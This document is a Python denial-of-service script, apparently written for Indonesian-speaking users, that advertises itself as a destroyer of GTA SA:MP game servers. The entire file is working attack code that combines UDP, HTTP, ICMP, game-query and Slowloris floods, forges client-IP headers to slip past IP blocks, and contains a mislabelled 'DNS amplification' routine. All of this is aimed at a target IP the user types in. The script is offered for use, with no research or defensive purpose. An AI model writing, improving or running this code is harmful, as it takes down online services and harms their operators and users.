#!/usr/bin/env python3
# ZAMZZZ DDOS BRUTAL - GTA SA:MP MODERN SERVER DESTROYER
# Command: python3 samp_killer.py <IP> <PORT>

import socket
import random
import threading
import time
import requests
import ssl
from concurrent.futures import ThreadPoolExecutor

# ========== KONFIGURASI BRUTAL ==========
THREADS = 5000
PACKET_SIZE = 65535
TIMEOUT = 0.01

# ========== SPOOF IP (BYPASS IP BLOCK) ==========
def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

# ========== LAYER 4: UDP FLOOD (BYPASS PTERODACTYL) ==========
def udp_flood(ip, port):
    data = random._urandom(PACKET_SIZE)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, PACKET_SIZE * 10)
    while True:
        try:
            sock.sendto(data, (ip, port))
            sock.sendto(data, (ip, port+1))
            sock.sendto(data, (ip, port+2))
            sock.sendto(data, (ip, port+3))
            sock.sendto(data, (ip, port+4))
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ========== LAYER 7: HTTP FLOOD (BYPASS ANTI-DDOS) ==========
def http_flood(ip, port):
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0', 'GoogleBot', 'BingBot', 'DuckDuckBot']),
        'Accept': '*/*',
        'Accept-Language': 'id-ID,id;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'X-Forwarded-For': random_ip(),
        'CF-Connecting-IP': random_ip(),
        'True-Client-IP': random_ip()
    }
    url = f"http://{ip}:{port}"
    while True:
        try:
            requests.get(url, headers=headers, timeout=TIMEOUT)
            requests.post(url, data={'z': random._urandom(1024)}, headers=headers, timeout=TIMEOUT)
        except:
            pass

# ========== LAYER 3: ICMP FLOOD (PING OF DEATH) ==========
def icmp_flood(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(65000)
    while True:
        try:
            sock.sendto(packet, (ip, 0))
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

# ========== AMPLIFICATION: DNS, NTP, SNMP ==========
def dns_amplify(ip):
    dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03'
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222']
    while True:
        for dns in dns_servers:
            try:
                sock.sendto(dns_query, (dns, 53))
                sock.sendto(dns_query, (ip, 53))
            except:
                pass

# ========== GTA SA:MP SPECIFIC QUERY FLOOD ==========
def samp_query_flood(ip, port):
    # SA:MP query packet
    samp_packet = b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x00' * 10
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(samp_packet, (ip, port))
            sock.sendto(samp_packet, (ip, port+100))
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ========== SLOWLORIS (BYPASS PTERODACTYL) ==========
def slowloris(ip, port):
    socks = []
    for _ in range(1000):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
            socks.append(s)
        except:
            pass
    while True:
        for s in socks:
            try:
                s.send(f"X-{random.randint(1,5000)}: {random.randint(1,5000)}\r\n".encode())
            except:
                socks.remove(s)
                try:
                    new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new.settimeout(4)
                    new.connect((ip, port))
                    new.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
                    socks.append(new)
                except:
                    pass
        time.sleep(10)

# ========== MAIN ==========
def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║     ZAMZZZ DDOS BRUTAL - SA:MP        ║
    ║     MODERN SERVER DESTROYER           ║
    ║                                        ║
    ║  [BYPASS ANTI-DDOS]                   ║
    ║  [BYPASS PTERODACTYL]                 ║
    ║  [BYPASS IP BLOCK]                    ║
    ║  [BYPASS ANTI-GIMMIC]                 ║
    ╚═══════════════════════════════════════╝
    """)
    
    ip = input("IP Target: ")
    port = int(input("Port (default 7777): ") or 7777)
    
    print(f"\n🔥 MENYERANG {ip}:{port} DENGAN {THREADS} THREAD 🔥\n")
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        # Layer 4
        for _ in range(int(THREADS * 0.3)):
            executor.submit(udp_flood, ip, port)
        # Layer 7
        for _ in range(int(THREADS * 0.2)):
            executor.submit(http_flood, ip, port)
        # ICMP
        for _ in range(int(THREADS * 0.1)):
            executor.submit(icmp_flood, ip)
        # Amplification
        for _ in range(int(THREADS * 0.1)):
            executor.submit(dns_amplify, ip)
        # SA:MP Specific
        for _ in range(int(THREADS * 0.2)):
            executor.submit(samp_query_flood, ip, port)
        # Slowloris
        for _ in range(int(THREADS * 0.1)):
            executor.submit(slowloris, ip, port)
    
    while True:
        time.sleep(1)
        print(f"[ZAMZZZ] 🔥 SERANGAN BERJALAN - {ip}:{port} 🔥")

if __name__ == "__main__":
    main()